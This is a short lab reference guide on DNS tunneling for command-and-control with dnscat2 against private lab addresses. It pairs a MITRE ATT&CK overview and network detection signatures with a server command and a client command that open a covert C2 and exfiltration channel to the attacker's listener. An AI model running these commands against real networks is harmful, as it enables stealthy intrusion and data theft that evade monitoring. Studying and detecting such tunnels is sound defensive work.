# DNS Tunneling C2 - Attacker Reference Guide

This folder documents standard DNS Tunneling configurations and theoretical usage of tunneling tools against a designated private target (e.g., `192.168.56.20`).

## 1. Overview of DNS Tunneling
DNS Tunneling encapsulates non-DNS traffic within standard DNS queries and replies (e.g. `TXT`, `CNAME`, or `MX` records). Since network firewalls and web proxies rarely inspect local DNS queries sent to internal resolvers, DNS serves as an effective, highly stealthy medium for data exfiltration and Command and Control (C2) communication. This maps to **MITRE ATT&CK T1048.003 (Exfiltration Over Alternative Protocol)**.

## 2. Command Reference

### Tunneling using `dnscat2`
`dnscat2` is designed to create an encrypted Command and Control channel over the DNS protocol.

#### A. Attacker (Server) Setup
Run the server daemon on the attacker machine, specifying a custom authority domain or running in local mode:
```bash
dnscat2 --dns "domain=dns.lab,port=53" --no-auth
```
* **`domain=dns.lab`**: Configures the zone names that the server will respond to.
* **`port=53`**: Sets local bind port.
* **`--no-auth`**: Disables encryption key validation during authentication phase (useful in testing).

#### B. Target (Client) Setup
The target machine connects back to the server. If direct queries are allowed:
```bash
dnscat2-client --dns "server=192.168.56.10,port=53"
```
* **`server=192.168.56.10`**: Specifies the DNS listener address.

## 3. Network Detection Signatures
* High rate of outgoing DNS queries from a single host resolving subdomain structures (e.g. `616263...dns.lab`).
* Subdomains within the query structure exceeding 50 characters in length.
* High ratio of anomalous query types (such as `TXT` or `NULL` records) compared to typical web browsing `A`/`AAAA` query rates.
* IDS alerts matching pattern matches for known DNS tunneling frames.
